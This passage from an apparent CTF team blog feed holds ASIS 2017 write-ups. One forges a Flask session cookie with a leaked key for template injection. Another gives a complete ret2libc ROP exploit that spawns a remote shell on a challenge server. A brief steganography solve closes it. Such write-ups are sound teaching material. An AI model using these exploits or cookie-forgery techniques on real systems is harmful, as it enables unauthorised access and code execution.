<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> page.find(<span class="string">'flag'</span>)&gt;=<span class="number">0</span>:</div><div class="line">        page = <span class="string">'notallowed.txt'</span></div></pre></td></tr></table></figure>
<p>We can include the key.py which contains a key, this key according to flask documentation is used to generate session cookies, the included key was 7h15_5h0uld_b3_r34lly<em>53cur3d.<br>If we analyse the golem function we can see its filtering the {, }, . and \</em> characters so we can’t template inject code here, well actually if we look closely, if we provide a session cookie “golem” it doesn’t apply this filter but first we need to encrypt the cookie,this is easy because we have the key!<br>We found a python code online that does this after some small modifications we ended up with this: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</div><div class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleSecureCookieSessionInterface</span><span class="params">(SecureCookieSessionInterface)</span>:</span></div><div class="line">	<span class="comment"># Override method</span></div><div class="line">	<span class="comment"># Take secret_key instead of an instance of a Flask app</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_signing_serializer</span><span class="params">(self, secret_key)</span>:</span></div><div class="line">		<span class="keyword">if</span> <span class="keyword">not</span> secret_key:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">		signer_kwargs = dict(</div><div class="line">			key_derivation=self.key_derivation,</div><div class="line">			digest_method=self.digest_method</div><div class="line">		)</div><div class="line">		<span class="keyword">return</span> URLSafeTimedSerializer(secret_key, salt=self.salt,</div><div class="line">		                              serializer=self.serializer,</div><div class="line">		                              signer_kwargs=signer_kwargs)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeFlaskCookie</span><span class="params">(secret_key, cookieValue)</span>:</span></div><div class="line">	sscsi = SimpleSecureCookieSessionInterface()</div><div class="line">	signingSerializer = sscsi.get_signing_serializer(secret_key)</div><div class="line">	<span class="keyword">return</span> signingSerializer.loads(cookieValue)</div><div class="line"></div><div class="line"><span class="comment"># Keep in mind that flask uses unicode strings for the</span></div><div class="line"><span class="comment"># dictionary keys</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlaskCookie</span><span class="params">(secret_key, cookieDict)</span>:</span></div><div class="line">	sscsi = SimpleSecureCookieSessionInterface()</div><div class="line">	signingSerializer = sscsi.get_signing_serializer(secret_key)</div><div class="line">	<span class="keyword">return</span> signingSerializer.dumps(cookieDict)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">	sk = <span class="string">'7h15_5h0uld_b3_r34lly_53cur3d'</span></div><div class="line">	sessionDict = &#123;<span class="string">u'golem'</span>:sys.argv[<span class="number">1</span>]&#125;</div><div class="line">	cookie = encodeFlaskCookie(sk, sessionDict)</div><div class="line">	decodedDict = decodeFlaskCookie(sk, cookie)</div><div class="line">        <span class="keyword">print</span> cookie</div></pre></td></tr></table></figure>
<p>We tried to read the flag.py via template python code but we failed hard, after that I stopped and decided to read about some global variables on flask documentation(<a href="http://flask.pocoo.org/docs/0.12/templating/" target="_blank" rel="external">http://flask.pocoo.org/docs/0.12/templating/</a>), and we found a config global variable we included and the flag was in the dictionary attribute ‘flag’:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python manageFlaskSession.py <span class="string">"&#123;&#123; config &#125;&#125;"</span></div><div class="line">eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc</div><div class="line"></div><div class="line">$ curl <span class="string">'https://golem.asisctf.com/golem'</span> -H <span class="string">'Cookie: session=eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc'</span> --data <span class="string">''</span></div><div class="line">&#123;--omited--,<span class="string">'flag'</span>:<span class="string">'ASIS&#123;I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!&#125;'</span>,--omited--&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Average: 4.57&lt;br&gt;Rating Count: 28&lt;br&gt;You Rated: Not rated&lt;br&gt;&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    NYUSEC&lt;br&gt;    0daysober&lt;br&gt;    Toky
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="flask" scheme="https://teamrocketist.github.io/tags/flask/"/>
    
      <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
    
      <category term="ssti" scheme="https://teamrocketist.github.io/tags/ssti/"/>
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
      <category term="sessionkey" scheme="https://teamrocketist.github.io/tags/sessionkey/"/>
    
      <category term="cookies" scheme="https://teamrocketist.github.io/tags/cookies/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] ASIS - Mrs. Hudson</title>
    <link href="https://teamrocketist.github.io/2017/09/10/Pwn-ASIS-Mrs-Hudson/"/>
    <id>https://teamrocketist.github.io/2017/09/10/Pwn-ASIS-Mrs-Hudson/</id>
    <published>2017-09-10T20:01:59.000Z</published>
    <updated>2017-09-11T05:17:41.681Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Average: 2.94<br>Rating Count: 17<br>Top 3 Solver<br><br>    dodododo<br>    RPISEC<br>    TokyoWesterns<br><br>Points<br>54<br>Solves<br>103<br>Category<br>Pwnable<br><br>Description:<br><br>    England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She?<br><br>    nc 178.62.249.106 8642<br>    nc 146.185.168.172 8642<br><br></blockquote>

<p>Lets start by checking the security of the binary (<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="external">https://github.com/slimm609/checksec.sh</a>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ checksec -f ./mrs._hudson</div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE</div><div class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No	0		0	./mrs._hudson</div></pre></td></tr></table></figure>
<p>We don’t have any kind of protections so analysing it with radare2<br><img src="https://i.imgur.com/aN2hr4k.png" alt="radare2"></p>
<p>The binary is pretty simple we have a scanf in the end, with it we can overflow the buffer…<br>My plan was:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1 - overflow the buffer and leak puts address.</div><div class="line">2 - search in the libc-database for a libc.so.</div><div class="line">3 - calculate system address and binsh address.</div><div class="line">4 - jump to main again.</div><div class="line">5 - overflow the buffer and jump to system(&apos;/bin/sh&apos;).</div></pre></td></tr></table></figure>
<hr>
<h3 id="Calculate-the-offset-to-RIP"><a href="#Calculate-the-offset-to-RIP" class="headerlink" title="Calculate the offset to RIP"></a>Calculate the offset to RIP</h3><p>We can use metasploit(to create the patterns) and gdb but first lets see the address of the ret instruction in assembly:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">|           0x00400680      e89bfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</div><div class="line">|           0x00400685      c9             leave</div><div class="line">\           0x00400686      c3             ret</div></pre></td></tr></table></figure>
<p>And now generate the patterns and use gdb to calculate the offset</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div><div class="line"></div><div class="line">$ gdb ./mrs._hudson</div><div class="line">pwndbg&gt; b *0x00400686</div><div class="line">pwndbg&gt; r</div><div class="line">Let<span class="string">'s go back to 2000.</span></div><div class="line"><span class="string">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span></div><div class="line"><span class="string">pwndbg&gt; x $rsp</span></div><div class="line"><span class="string">0x7fffffffde08:	0x6541316541306541</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6541316541306541</span></div><div class="line"><span class="string">[*] Exact match at offset 120</span></div></pre></td></tr></table></figure>
<p>The offset is 120.</p>
<hr>
<h3 id="Leak-puts-address"><a href="#Leak-puts-address" class="headerlink" title="Leak puts address"></a>Leak puts address</h3><p>We have to leak the libc address from puts, we can do this by using puts_plt and puts_got addresses with return oriented programming, keep in mind that in x86 parameters are stored on the stack, but in x64 the first six parameters are saved in <code>RDI, RSI, RDX, RCX, R8 and R9</code>, if there are more parameters will be saved on the stack. So if we want to build the Rop chain to call puts we should first <code>POP RDI RET</code> so we save the next value in the stack to RDI.</p>
<p>To find the <code> POP RDI; RET </code> gadget we can use <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPgadgets</a>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary ./mrs._hudson --only <span class="string">"pop|ret"</span></div><div class="line">Gadgets information</div><div class="line">============================================================</div><div class="line">0x00000000004006ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006ee : pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006f0 : pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006f2 : pop r15 ; ret</div><div class="line">0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006ef : pop rbp ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400575 : pop rbp ; ret</div><div class="line">0x00000000004006f3 : pop rdi ; ret</div><div class="line">0x00000000004006f1 : pop rsi ; pop r15 ; ret</div><div class="line">0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004004ee : ret</div><div class="line">0x00000000004005a5 : ret 0xc148</div></pre></td></tr></table></figure>
<p>Now start building our exploit to leak puts libc address:   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./mrs._hudson'</span>)</div><div class="line">local = <span class="keyword">True</span></div><div class="line"></div><div class="line">POPRET = <span class="number">0x00000000004006f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span> * <span class="number">120</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line"></div><div class="line">r = process(<span class="string">'./mrs._hudson'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'178.62.249.106'</span>, <span class="number">8642</span>)</div><div class="line">r.recvline()</div><div class="line"></div><div class="line">r.sendline(padding + ropchain)</div><div class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"PUTS 0x%x"</span> % PUTS)</div></pre></td></tr></table></figure>
<hr>
<h3 id="Search-libc-database"><a href="#Search-libc-database" class="headerlink" title="Search libc-database"></a>Search libc-database</h3><p>We can user this <a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a> and try to find a lib to corresponds to our puts leaked address:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ python mrs._hudson.py</div><div class="line">[*] &apos;~/ctf/asis/pwn/mrs._hudson&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to 178.62.249.106 on port 8642: Done</div><div class="line">[*] Puts 0x7fc73fd10690</div><div class="line"></div><div class="line">$ ./find puts 0x7fc73fd10690 #libc-database folder</div><div class="line">ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu9_amd64)</div><div class="line">~/ctf/tokyo/pwn/swap/libc.so.6 (id local-14c22be9aa11316f89909e4237314e009da38883)</div></pre></td></tr></table></figure>
<p>It was funny because it was the same libc.so of a challenge I did previously in tokyo westerns.</p>
<hr>
<h3 id="Calculate-libcbase-and-other-addresses"><a href="#Calculate-libcbase-and-other-addresses" class="headerlink" title="Calculate libcbase and other addresses"></a>Calculate libcbase and other addresses</h3><p>Now that we have the lib.so.6 we can now use extract from it the offsets using <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">pwntools</a>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">binary = ELF(<span class="string">'./mrs._hudson'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>) <span class="comment"># got libc from libc-database</span></div><div class="line">local = <span class="keyword">False</span></div><div class="line"></div><div class="line">POPRET = <span class="number">0x00000000004006f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span> * <span class="number">120</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"></div><div class="line">r = process(<span class="string">'./mrs._hudson'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'178.62.249.106'</span>, <span class="number">8642</span>)</div><div class="line">r.recvline()</div><div class="line"></div><div class="line">r.sendline(padding + ropchain)</div><div class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">LIBCBASE = PUTS - libc.symbols[<span class="string">'puts'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x18cd17</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % (BINSH))</div></pre></td></tr></table></figure>
<hr>
<h3 id="Return-to-main-and-jump-to-system-‘-bin-sh’"><a href="#Return-to-main-and-jump-to-system-‘-bin-sh’" class="headerlink" title="Return to main and jump to system(‘/bin/sh’)"></a>Return to main and jump to system(‘/bin/sh’)</h3><p>First lets get the main address from radare2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">            ;-- main:</div><div class="line">/ (fcn) sym.main 109</div><div class="line">|   sym.main ();</div><div class="line">|           ; var int local_80h @ rbp-0x80</div><div class="line">|           ; var int local_74h @ rbp-0x74</div><div class="line">|           ; var int local_70h @ rbp-0x70</div><div class="line">|              ; DATA XREF from 0x0040054d (entry0)</div><div class="line">|           0x0040061a      55             push rbp</div></pre></td></tr></table></figure>
<p>We add MAIN to our rop chain, after we execute puts, we jump to main again:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">MAIN = <span class="number">0x000000000040061A</span></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div></pre></td></tr></table></figure>
<p>And now the final exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct </div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./mrs._hudson'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'178.62.249.106'</span>, <span class="number">8642</span>)</div><div class="line"></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./mrs._hudson'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>) <span class="comment"># got libc from libc-database</span></div><div class="line">local = <span class="keyword">False</span></div><div class="line"></div><div class="line">POPRET = <span class="number">0x00000000004006f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x000000000040061A</span></div><div class="line"></div><div class="line">padding = <span class="string">'A'</span> * <span class="number">120</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"></div><div class="line">r = getConn()</div><div class="line">r.recvline()</div><div class="line"></div><div class="line">r.sendline(padding + ropchain)</div><div class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">LIBCBASE = PUTS - libc.symbols[<span class="string">'puts'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x18cd17</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"PUTS 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % (BINSH))</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">r.sendline(padding + p64(POPRET) + p64(BINSH) + p64(SYSTEM))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Run and get the flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">$ python mrs._hudson.py</div><div class="line">[*] <span class="string">'~/ctf/asis/pwn/mrs._hudson'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[*] <span class="string">'~/ctf/asis/pwn/libc.so.6'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] Opening connection to 178.62.249.106 on port 8642: Done</div><div class="line">[*] LIBC 0x7ff6d2ec0000</div><div class="line">[*] PUTS 0x7ff6d2f2f690</div><div class="line">[*] SYSTEM 0x7ff6d2f05390</div><div class="line">[*] Binsh 0x7ff6d304cd17</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls home</div><div class="line">frontofficemanager</div><div class="line">$ ls home/frontofficemanager</div><div class="line">flag</div><div class="line">hudson_3ab429dd29d62964e5596e6afe0d17d9</div><div class="line">$ cat home/frontofficemanager/flag</div><div class="line">ASIS&#123;W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Average: 2.94&lt;br&gt;Rating Count: 17&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    dodododo&lt;br&gt;    RPISEC&lt;br&gt;    TokyoWesterns&lt;br&gt;&lt;br&gt;Points&lt;br&gt;54
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
  </entry>
  
  <entry>
    <title>[Stego] ASIS - ASIS secret letter</title>
    <link href="https://teamrocketist.github.io/2017/09/10/Stego-ASIS-ASIS-secret-letter/"/>
    <id>https://teamrocketist.github.io/2017/09/10/Stego-ASIS-ASIS-secret-letter/</id>
    <published>2017-09-10T18:10:59.000Z</published>
    <updated>2017-09-10T18:46:40.288Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br> ASIS secret letter<br><br>Average: 4.17<br>Rating Count: 6<br>You Rated: 5<br>Top 3 Solver<br><br>    Teamrocketist<br>    dcua<br>    CodiSec<br><br>Points<br>202<br>Solves<br>17<br>Category<br>Misc Stego<br><br>Description:<br><br>    The face is the index of the mind, its ASIS secret letter!<br></blockquote>


<p>We have two images lets use binwalk on the jpg image:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ binwalk a.jpg </div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">56            0x38            Zlib compressed data, default compression</div></pre></td></tr></table></figure>
<p>Doesn’t look like it has something special so lets extract the files using binwalk again but with the parameter e:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ binwalk -e a.jpg</div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">56            0x38            Zlib compressed data, default compression</div></pre></td></tr></table></figure>
<p>Binwalk will create a folder with extracted files:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls_a.jpg.extracted/</div><div class="line">38  38.zlib</div></pre></td></tr></table></figure>
<p>Checking the 38 file we can see we have a double encoded base64 string:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat 38 | base64 -d | base64 -d</div><div class="line">💌  from ASIS with love, please find secret message and reply soon, powered by 👉  Stéganô 👈⏎</div></pre></td></tr></table></figure>
